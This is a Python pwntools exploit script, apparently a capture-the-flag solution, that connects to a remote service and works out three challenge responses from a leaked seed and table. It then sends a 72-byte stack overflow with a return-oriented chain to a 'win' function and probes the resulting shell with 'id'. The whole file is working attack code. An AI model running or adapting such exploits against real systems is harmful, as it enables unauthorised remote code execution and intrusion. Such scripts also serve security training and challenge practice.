#!/usr/bin/env python3
import sys, re, time
from pwn import remote, context, p64
context.log_level = 'error'
HOST, PORT = sys.argv[1], int(sys.argv[2])

POP_RDI, WIN = 0x4019AD, 0x4019C5
def rol7(x):
    x &= 0xFFFFFFFF
    return ((x << 7) | (x >> 25)) & 0xFFFFFFFF

io = remote(HOST, PORT)
d = io.recvuntil(b'A: '); print('BANNER', repr(d))
seed = int(re.search(rb'seed ([0-9a-f]{8})', d).group(1), 16)
k1 = (seed * 0x9e3779b9) & 0xFFFFFFFF
io.send(('%x\n' % k1).encode())
io.recvuntil(b'B: ')
k2 = rol7(k1) ^ 0x5A5A5A5A
io.send(('%x\n' % k2).encode())
d = io.recvuntil(b'C: '); print('TABLE', repr(d))
t = d.decode('latin-1')
tbl = [int(v, 16) for v in re.findall(r'[0-9a-f]{8}', t.split('table:')[1])[:16]]
a, b = map(int, re.search(r'idx (-?\d+) (-?\d+)', t).groups())
ans3 = tbl[a] ^ tbl[b]
io.send(('%x\n' % ans3).encode())
gw = rol7(k2 ^ ans3 ^ 0x13371337)
io.recvuntil(b'D> ')
io.send(b'A' * 72 + p64(POP_RDI) + p64(gw) + p64(0x4019B1) + p64(WIN))
print('AFTER', repr(io.recv(timeout=3)))

for i in range(3):
    try:
        io.send(b'echo HI%d; id\n' % i)
    except Exception as e:
        print('send err', e); break
    try:
        c = io.recv(timeout=2)
    except Exception as e:
        print('recv err at', i, e); break
    print('R%d' % i, repr(c))
    if not c:
        print('EOF at', i); break
io.close()
